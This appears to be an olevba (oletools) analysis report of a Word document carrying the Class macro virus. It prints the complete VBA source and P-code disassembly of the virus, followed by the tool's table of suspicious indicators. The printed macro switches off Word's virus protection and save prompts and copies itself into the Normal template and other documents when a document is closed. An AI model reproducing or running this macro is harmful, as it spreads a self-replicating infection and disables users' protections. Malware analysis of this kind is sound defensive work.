olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.bl
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.bl - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'MACRO11/8/99 3:52:20 PMCLASS-DP
On Error GoTo out
'MACRO11/8/99 3:52:20 PMCLASS-DP
Options.VirusProtection = False
'MACRO11/8/99 3:52:20 PMCLASS-DP
Options.SaveNormalPrompt = False
'MACRO11/8/99 3:52:20 PMCLASS-DP
Options.ConfirmConversions = False
'MACRO11/8/99 3:52:20 PMCLASS-DP
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'MACRO11/8/99 3:52:20 PMCLASS-DP
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'MACRO11/8/99 3:52:20 PMCLASS-DP
If nt > 70 And ad > 0 Then GoTo out
'MACRO11/8/99 3:52:20 PMCLASS-DP
If nt < 70 Then
'MACRO11/8/99 3:52:20 PMCLASS-DP
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'MACRO11/8/99 3:52:20 PMCLASS-DP
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'MACRO11/8/99 3:52:20 PMCLASS-DP
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'MACRO11/8/99 3:52:20 PMCLASS-DP
End If
'MACRO11/8/99 3:52:20 PMCLASS-DP
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'MACRO11/8/99 3:52:20 PMCLASS-DP
host.codemodule.AddFromFile ("c:\class.sys")
'MACRO11/8/99 3:52:20 PMCLASS-DP
With host.codemodule
'MACRO11/8/99 3:52:20 PMCLASS-DP
    For x = 1 To 4
'MACRO11/8/99 3:52:20 PMCLASS-DP
    .deletelines 1
'MACRO11/8/99 3:52:20 PMCLASS-DP
    Next x
'MACRO11/8/99 3:52:20 PMCLASS-DP
End With
'MACRO11/8/99 3:52:20 PMCLASS-DP
If nt < 70 Then
'MACRO11/8/99 3:52:20 PMCLASS-DP
    With host.codemodule
'MACRO11/8/99 3:52:20 PMCLASS-DP
    .replaceline 1, "Sub AutoClose()"
'MACRO11/8/99 3:52:20 PMCLASS-DP
    .replaceline 71, "Sub ToolsMacro()"
'MACRO11/8/99 3:52:20 PMCLASS-DP
    End With
'MACRO11/8/99 3:52:20 PMCLASS-DP
End If
'MACRO11/8/99 3:52:20 PMCLASS-DP
With host.codemodule
'MACRO11/8/99 3:52:20 PMCLASS-DP
    For x = 2 To 72 Step 2
'MACRO11/8/99 3:52:20 PMCLASS-DP
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'MACRO11/8/99 3:52:20 PMCLASS-DP
    Next x
'MACRO11/8/99 3:52:20 PMCLASS-DP
End With
'MACRO11/8/99 3:52:20 PMCLASS-DP
out:
'MACRO11/8/99 3:52:20 PMCLASS-DP
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'MACRO11/8/99 3:52:20 PMCLASS-DP
End Sub
'MACRO11/8/99 3:52:20 PMCLASS-DP

'MACRO11/8/99 3:52:20 PMCLASS-DP
Sub ToolsMacro()
'MACRO11/8/99 3:52:20 PMCLASS-DP
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
Options.VirusProtection = False
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
Options.SaveNormalPrompt = False
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
Options.ConfirmConversions = False
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
If nt > 70 And ad > 0 Then GoTo out
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
If nt < 70 Then
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
End If
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
host.codemodule.AddFromFile ("c:\class.sys")
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
With host.codemodule
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
    For x = 1 To 4
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
    .deletelines 1
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
    Next x
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
End With
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
If nt < 70 Then
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
    With host.codemodule
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
    .replaceline 1, "Sub AutoClose()"
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
    .replaceline 71, "Sub ToolsMacro()"
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
    End With
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
End If
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
With host.codemodule
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
    For x = 2 To 72 Step 2
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
    Next x
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
End With
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
out:
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1
End Sub
'Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.bl
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 11673 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #2:
' 	OnError out 
' Line #3:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #7:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #9:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #10:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St ad 
' Line #11:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #12:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St nt 
' Line #13:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #14:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #15:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #16:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #17:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #18:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' Line #19:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #20:
' 	Ld host 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #21:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #22:
' 	LitStr 0x000C "c:\class.sys"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #23:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #26:
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' 	EndIf 
' Line #27:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #28:
' 	LitStr 0x000C "c:\class.sys"
' 	Paren 
' 	Ld host 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #29:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #30:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #31:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #32:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #33:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #34:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #35:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #36:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #37:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #38:
' 	EndWith 
' Line #39:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #40:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #41:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #42:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #43:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #44:
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #45:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #46:
' 	LitDI2 0x0047 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #47:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #48:
' 	EndWith 
' Line #49:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #52:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #53:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #54:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x0048 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #55:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #56:
' 	Ld x 
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #57:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #58:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #60:
' 	EndWith 
' Line #61:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #62:
' 	Label out 
' Line #63:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #64:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #65:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #66:
' 	EndSub 
' Line #67:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #68:
' Line #69:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #70:
' 	FuncDefn (Sub ToolsMacro())
' Line #71:
' 	QuoteRem 0x0000 0x001F "MACRO11/8/99 3:52:20 PMCLASS-DP"
' Line #72:
' 	QuoteRem 0x0000 0x0043 "Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1"
' Line #73:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #74:
' 	QuoteRem 0x0000 0x0043 "Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1"
' Line #75:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #76:
' 	QuoteRem 0x0000 0x0043 "Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1"
' Line #77:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #78:
' 	QuoteRem 0x0000 0x0043 "Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1"
' Line #79:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St ad 
' Line #80:
' 	QuoteRem 0x0000 0x0043 "Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1"
' Line #81:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St nt 
' Line #82:
' 	QuoteRem 0x0000 0x0043 "Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1"
' Line #83:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #84:
' 	QuoteRem 0x0000 0x0043 "Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1"
' Line #85:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #86:
' 	QuoteRem 0x0000 0x0043 "Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1"
' Line #87:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' Line #88:
' 	QuoteRem 0x0000 0x0043 "Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1"
' Line #89:
' 	Ld host 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #90:
' 	QuoteRem 0x0000 0x0043 "Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1"
' Line #91:
' 	LitStr 0x000C "c:\class.sys"
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #92:
' 	QuoteRem 0x0000 0x0043 "Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1"
' Line #93:
' 	EndIfBlock 
' Line #94:
' 	QuoteRem 0x0000 0x0043 "Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1"
' Line #95:
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set host 
' 	EndIf 
' Line #96:
' 	QuoteRem 0x0000 0x0043 "Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1"
' Line #97:
' 	LitStr 0x000C "c:\class.sys"
' 	Paren 
' 	Ld host 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #98:
' 	QuoteRem 0x0000 0x0043 "Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1"
' Line #99:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #100:
' 	QuoteRem 0x0000 0x0043 "Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1"
' Line #101:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #102:
' 	QuoteRem 0x0000 0x0043 "Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1"
' Line #103:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #104:
' 	QuoteRem 0x0000 0x0043 "Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1"
' Line #105:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #106:
' 	QuoteRem 0x0000 0x0043 "Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1"
' Line #107:
' 	EndWith 
' Line #108:
' 	QuoteRem 0x0000 0x0043 "Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1"
' Line #109:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Lt 
' 	IfBlock 
' Line #110:
' 	QuoteRem 0x0000 0x0043 "Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1"
' Line #111:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #112:
' 	QuoteRem 0x0000 0x0043 "Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1"
' Line #113:
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #114:
' 	QuoteRem 0x0000 0x0043 "Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1"
' Line #115:
' 	LitDI2 0x0047 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #116:
' 	QuoteRem 0x0000 0x0043 "Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1"
' Line #117:
' 	EndWith 
' Line #118:
' 	QuoteRem 0x0000 0x0043 "Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1"
' Line #119:
' 	EndIfBlock 
' Line #120:
' 	QuoteRem 0x0000 0x0043 "Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1"
' Line #121:
' 	StartWithExpr 
' 	Ld host 
' 	MemLd codemodule 
' 	With 
' Line #122:
' 	QuoteRem 0x0000 0x0043 "Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1"
' Line #123:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x0048 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #124:
' 	QuoteRem 0x0000 0x0043 "Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1"
' Line #125:
' 	Ld x 
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #126:
' 	QuoteRem 0x0000 0x0043 "Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1"
' Line #127:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #128:
' 	QuoteRem 0x0000 0x0043 "Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1"
' Line #129:
' 	EndWith 
' Line #130:
' 	QuoteRem 0x0000 0x0043 "Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1"
' Line #131:
' 	Label out 
' Line #132:
' 	QuoteRem 0x0000 0x0043 "Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1"
' Line #133:
' 	Ld nt 
' 	LitDI2 0x0046 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #134:
' 	QuoteRem 0x0000 0x0043 "Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1"
' Line #135:
' 	EndSub 
' Line #136:
' 	QuoteRem 0x0000 0x0043 "Costin Raiu6/20/99 3:45:17 PMXerox 4900 PostScript on FILE:GOAT97-1"
' Line #137:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

